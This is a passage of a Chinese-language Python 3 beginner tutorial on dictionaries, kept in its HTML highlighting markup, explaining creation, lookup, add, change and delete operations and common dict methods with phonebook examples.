<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>从上面可以看出，创建字典的基本格式为<code>&#123; 键1:值1, 键2:值2, 键3:值3 ...&#125;</code>。除了这种方法，我们还可以通过dict函数传递关键字参数来创建字典，像下面这样：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> phonebook <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>Aganzo<span class="token operator">=</span><span class="token string">'1230'</span><span class="token punctuation">,</span> Jack<span class="token operator">=</span><span class="token string">'0221'</span><span class="token punctuation">,</span> Lee<span class="token operator">=</span><span class="token string">'1354'</span><span class="token punctuation">,</span> Emilie<span class="token operator">=</span><span class="token string">'2479'</span><span class="token punctuation">)</span> <span class="token comment"># 关键字参数就是字典的键，参数值就是字典的值</span>
<span class="token operator">>></span><span class="token operator">></span> phonebook
<span class="token punctuation">&#123;</span><span class="token string">'Aganzo'</span><span class="token punctuation">:</span> <span class="token string">'1230'</span><span class="token punctuation">,</span> <span class="token string">'Jack'</span><span class="token punctuation">:</span> <span class="token string">'0221'</span><span class="token punctuation">,</span> <span class="token string">'Lee'</span><span class="token punctuation">:</span> <span class="token string">'1354'</span><span class="token punctuation">,</span> <span class="token string">'Emilie'</span><span class="token punctuation">:</span> <span class="token string">'2479'</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们常用第一种方式创建字典，第二种方式比较少用，而且第二种方式有一个缺点：因为关键字参数会变为字典的键，所以键必须符合参数的命名规则（字母或下划线<code>_</code>开头，其后是数字、字母或下划线）。</p>
<p><strong>补充</strong>：创建空字典有两种方法，一种是直接使用<code>&#123;&#125;</code>；另一种是调用dict函数时，参数留空，即<code>dict()</code>；像<code>键:值</code>这样的东西叫做字典的 <strong>“项”</strong>。</p>
<h3 id="字典基本操作"><a href="#字典基本操作" class="headerlink" title="字典基本操作"></a>字典基本操作</h3><p>字典的基本操作有：<strong>增</strong>、<strong>删</strong>、<strong>改</strong>、<strong>查</strong>。</p>
<p>先来说“查”：我们可以通过名字来查找电话簿中的电话号码，在字典中类似这样，通过“键”来查“值”，基本格式为<code>字典[键]</code>：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> phonebook<span class="token punctuation">[</span><span class="token string">'Aganzo'</span><span class="token punctuation">]</span>
<span class="token string">'1230'</span>
<span class="token operator">>></span><span class="token operator">></span> phonebook<span class="token punctuation">[</span><span class="token string">'Jack'</span><span class="token punctuation">]</span>
<span class="token string">'0221'</span>
<span class="token operator">>></span><span class="token operator">></span> phonebook<span class="token punctuation">[</span><span class="token string">'Lily'</span><span class="token punctuation">]</span>
Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>
  File <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>
KeyError<span class="token punctuation">:</span> <span class="token string">'Lily'</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>从上面的代码可以看出，我们的“电话簿”中不存在Lily的电话号码，可知，当字典中不存在要查的元素时，python会提示报错。我们可以在查之前确认字典中是否有对应的项，使用成员运算符<code>in</code>：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'Lily'</span> <span class="token keyword">in</span> phonebook <span class="token comment"># 不存在</span>
<span class="token boolean">False</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">'Jack'</span> <span class="token keyword">in</span> phonebook <span class="token comment"># 存在</span>
<span class="token boolean">True</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>或者查看“电话簿”中所有人的电话号码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> key <span class="token keyword">in</span> phonebook<span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%s=>%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>key<span class="token punctuation">,</span> phonebook<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
Aganzo<span class="token operator">=</span><span class="token operator">></span><span class="token number">1230</span>
Jack<span class="token operator">=</span><span class="token operator">></span><span class="token number">0221</span>
Lee<span class="token operator">=</span><span class="token operator">></span><span class="token number">1354</span>
Emilie<span class="token operator">=</span><span class="token operator">></span><span class="token number">2479</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>再来说“改”：此时得知Lee更换了电话号码为112233，需要对电话簿进行更改，使用如下代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> phonebook<span class="token punctuation">[</span><span class="token string">'Lee'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'112233'</span>
<span class="token operator">>></span><span class="token operator">></span> phonebook
<span class="token punctuation">&#123;</span><span class="token string">'Aganzo'</span><span class="token punctuation">:</span> <span class="token string">'1230'</span><span class="token punctuation">,</span> <span class="token string">'Jack'</span><span class="token punctuation">:</span> <span class="token string">'0221'</span><span class="token punctuation">,</span> <span class="token string">'Lee'</span><span class="token punctuation">:</span> <span class="token string">'112233'</span><span class="token punctuation">,</span> <span class="token string">'Emilie'</span><span class="token punctuation">:</span> <span class="token string">'2479'</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>再到“增”：假设新认识了一位朋友Zieg，得到了朋友的电话号码为123456，需要在“电话簿”中新增一项，和“改”操作一样，使用赋值运算符<code>=</code>：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> phonebook<span class="token punctuation">[</span><span class="token string">'Zieg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'123456'</span>
<span class="token operator">>></span><span class="token operator">></span> phonebook
<span class="token punctuation">&#123;</span><span class="token string">'Aganzo'</span><span class="token punctuation">:</span> <span class="token string">'1230'</span><span class="token punctuation">,</span> <span class="token string">'Jack'</span><span class="token punctuation">:</span> <span class="token string">'0221'</span><span class="token punctuation">,</span> <span class="token string">'Lee'</span><span class="token punctuation">:</span> <span class="token string">'112233'</span><span class="token punctuation">,</span> <span class="token string">'Emilie'</span><span class="token punctuation">:</span> <span class="token string">'2479'</span><span class="token punctuation">,</span> <span class="token string">'Zieg'</span><span class="token punctuation">:</span> <span class="token string">'123456'</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>最后说“删”：朋友Jack与你绝交了（世事无常<code>╮(╯▽╰)╭</code>），你决定删除他的联系方式，此时你狠心地运行了下面的代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">del</span> phonebook<span class="token punctuation">[</span><span class="token string">'Jack'</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> phonebook
<span class="token punctuation">&#123;</span><span class="token string">'Aganzo'</span><span class="token punctuation">:</span> <span class="token string">'1230'</span><span class="token punctuation">,</span> <span class="token string">'Lee'</span><span class="token punctuation">:</span> <span class="token string">'112233'</span><span class="token punctuation">,</span> <span class="token string">'Emilie'</span><span class="token punctuation">:</span> <span class="token string">'2479'</span><span class="token punctuation">,</span> <span class="token string">'Zieg'</span><span class="token punctuation">:</span> <span class="token string">'123456'</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>“电话簿”中再也没有了Jack的电话号码……</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>好了，一个简单的示例过后，相信大家能理解字典的使用方法了，让我们来一个小小的总结：</p>
<p>创建字典的方法：</p>
<ul>
<li>通过花括号创建 <code>x = &#123;键1:值1, 键2:值2, 键3:值3 ...&#125;</code></li>
<li>通过dict函数创建 <code>x = dict(key1=value1, key2=value2, key3=value3 ...)</code></li>
<li>创建空字典可以使用 <code>x = &#123;&#125;</code>或<code>x = dict()</code></li>
</ul>
<p>字典的基本操作：</p>
<ul>
<li>增：<code>x[&#39;abc&#39;] = 123</code> （键’abc’不存在）</li>
<li>删：<code>del x[&#39;abc&#39;]</code></li>
<li>改：<code>x[&#39;abc] += 1</code>、<code>x[&#39;abc&#39;] = 2</code>、<code>x[&#39;abc&#39;] *= 10</code>……（键’abc’存在）</li>
<li>查：<code>result = x[&#39;abc&#39;]</code>、<code>print(x[&#39;abc&#39;])</code>……（键’abc’存在）</li>
</ul>
<p><strong>补充</strong>：字典的用法和列表类似，只不过列表索引元素的时候使用的是数字作键，而字典大多数时候使用字符串索引元素。</p>
<hr>
<p>关于字典的键，还有一点是要说清楚的：前面我们使用字典的时候都是使用了字符串类型的键，可我没有说字典的键只能是字符串！</p>
<p>实际上，字典的键可以是任意的不可变类型，如：字符串（最常用）、元组、浮点数、整数。</p>
<hr>
<h2 id="字典方法"><a href="#字典方法" class="headerlink" title="字典方法"></a>字典方法</h2><p>字典也是对象，和列表一样，字典也提供了一些实用的方法，下面是介绍</p>
<h3 id="clear"><a href="#clear" class="headerlink" title="clear"></a>clear</h3><p>clear方法用于清空字典中的所有项：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> d <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'feather'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> d
<span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'feather'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token number">18</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> d<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> d
<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个方法是原地的操作，意思就是操作对象是在字典本身，这和直接将变量赋值为空字典是不一样的，从下面的例子可以看出：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'a'</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> y <span class="token operator">=</span> x <span class="token comment"># y变量引用的字典和x变量引用的是同一个字典</span>
<span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token comment"># 将x变量引用改为另一个字典，这个字典是空字典</span>
<span class="token operator">>></span><span class="token operator">></span> x
<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> y <span class="token comment"># y变量引用的字典没有被改变</span>
<span class="token punctuation">&#123;</span><span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h3><p>copy方法用于返回一个新字典，这个新字典和原来的字典拥有相同的项：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'feather'</span><span class="token punctuation">,</span> <span class="token string">'blog'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'https://blog.csdn.net/lonely_feather'</span><span class="token punctuation">,</span> <span class="token string">'https://featherl.gitee.io/'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> y <span class="token operator">=</span> x<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> y<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Lee'</span>
<span class="token operator">>></span><span class="token operator">></span> y<span class="token punctuation">[</span><span class="token string">'blog'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'https://www.cnblogs.com/featherl/'</span><span class="token punctuation">)</span> 
<span class="token operator">>></span><span class="token operator">></span> x
<span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'feather'</span><span class="token punctuation">,</span> <span class="token string">'blog'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'https://blog.csdn.net/lonely_feather'</span><span class="token punctuation">,</span> <span class="token string">'https://featherl.gitee.io/'</span><span class="token punctuation">,</span> <span class="token string">'https://www.cnblogs.com/featherl/'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> y
<span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'Lee'</span><span class="token punctuation">,</span> <span class="token string">'blog'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'https://blog.csdn.net/lonely_feather'</span><span class="token punctuation">,</span> <span class="token string">'https://featherl.gitee.io/'</span><span class="token punctuation">,</span> <span class="token string">'https://www.cnblogs.com/featherl/'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到，y字典是从x复制而来的，所以改变y字典的键为’name’的项的时候并不影响x字典，要注意的是，<code>y[&#39;blog&#39;].append(&#39;https://www.cnblogs.com/featherl/&#39;)</code>这句代码不属于修改y字典，这是修改y字典的键为’blog’的项引用的列表，而y字典和x字典的’blog’项引用的是同一个列表（因为y字典的项是从x字典中复制而来的），所以修改这个列表的时候，在x和y两个字典上都可以看到效果。</p>
<p>这种问题是因为copy方法是“浅复制”，copy方法仅仅把相同的值存储到了一个新的字典里，要想避免这种问题，需要使用“深复制”，可以使用copy模块的deepcopy函数来实现：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> copy <span class="token keyword">import</span> deepcopy
<span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'list'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> y <span class="token operator">=</span> deepcopy<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> y<span class="token punctuation">[</span><span class="token string">'list'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> x
<span class="token punctuation">&#123;</span><span class="token string">'list'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> y
<span class="token punctuation">&#123;</span><span class="token string">'list'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="fromkeys"><a href="#fromkeys" class="headerlink" title="fromkeys"></a>fromkeys</h3><p>fromkeys方法用给定的键创建新字典，每个键对应的默认值都为None：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>fromkeys<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">dict</span><span class="token punctuation">.</span>fromkeys<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面代码的第一个例子中，我们创建了一个空字典，然后使用这个空字典的fromkeys方法创建了一个新字典，第二个例子中，我们直接使用dict这个类（实际上dict不是函数，是一个“类”）的fromkeys方法创建新字典。</p>
<p>我们还可以自己设置默认值：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">dict</span><span class="token punctuation">.</span>fromkeys<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'???'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'???'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token string">'???'</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><p>get方法使用给定的键访问字典中的项，不过，如果字典中不存在该项时，get方法返回默认值None，而不是报错：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'Lee'</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'age'</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
Lee
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'age'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token boolean">None</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>同样的，这个默认值也是可以自己设定的：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'Lee'</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'age'</span><span class="token punctuation">,</span> <span class="token string">'???'</span><span class="token punctuation">)</span>
<span class="token string">'???'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>update方法将一个新字典合并到当前字典，当存在相同的键，用新字典的值进行覆盖：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'Lee'</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'Lee'</span><span class="token punctuation">,</span> <span class="token string">'blog'</span><span class="token punctuation">:</span><span class="token string">'https://featherl.gitee.io'</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> y <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'feather'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>update<span class="token punctuation">(</span>y<span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> x
<span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'feather'</span><span class="token punctuation">,</span> <span class="token string">'blog'</span><span class="token punctuation">:</span> <span class="token string">'https://featherl.gitee.io'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token number">18</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p>pop方法用来返回指定键的项，并将该项从字典中移除：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token number">1</span>
<span class="token operator">>></span><span class="token operator">></span> x
<span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的例子同时也证明了字典的键不一定是字符串。</p>
<h3 id="popitem"><a href="#popitem" class="headerlink" title="popitem"></a>popitem</h3><p>popitem方法随机挑选一个项返回，并删除这个项。字典不同于列表，字典的项是没有顺序，不同的机器或者不同版本的python，其字典存储项的顺序可能是不一样的，故popitem方法具体处理哪一项是没法预测的。</p>
<p>使用举例如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>pop
x<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>      x<span class="token punctuation">.</span>popitem<span class="token punctuation">(</span>  
<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">help</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>popitem<span class="token punctuation">)</span>

<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>popitem<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>popitem<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>popitem<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>popitem<span class="token punctuation">(</span><span class="token punctuation">)</span>
Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>
  File <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>
KeyError<span class="token punctuation">:</span> <span class="token string">'popitem(): dictionary is empty'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>当字典为空的时候，该方法抛出错误。</p>
<h3 id="items"><a href="#items" class="headerlink" title="items"></a>items</h3><p>items方法返回字典的所有的项，每个项为一个形式为<code>(key, value)</code>的元组，返回的类型是一种类似列表的类型，可以使用<code>for</code>循环迭代，但是没有列表的方法，最好先使用list转换成列表：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'Lee'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span>
dict_items<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'Lee'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'age'</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">list</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 转换成列表</span>
<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'Lee'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'age'</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>注意</strong>：在python2中此方法还有后面的keys、values方法返回的就是列表类型，不过我们学的是python3，要注意区分。</p>
<p>类似items的方法还有：</p>
<ul>
<li>keys方法返回字典的所有的键（类似列表的类型）</li>
<li>values方法返回字典的所有的值（类似列表的类型）</li>
</ul>
<hr>
<p>到此为止，本系列教程的python数据结构已经介绍完了，在本系列教程只是介绍了python中如何使用常用数据结构，并没有讲实现原理。而数据结构在计算机领域是不可或缺的，希望对数据结构了解甚少的读者可以认真学习一下数据结构的相关知识。</p>
<p>等学习完文件操作后，我们将用一个小项目实践一下（其实忽略文件操作，目前学到的知识还是可以做很多东西的），敬请期待！ <code>(￣︶￣)↗</code></p>
]]></content>
      <categories>
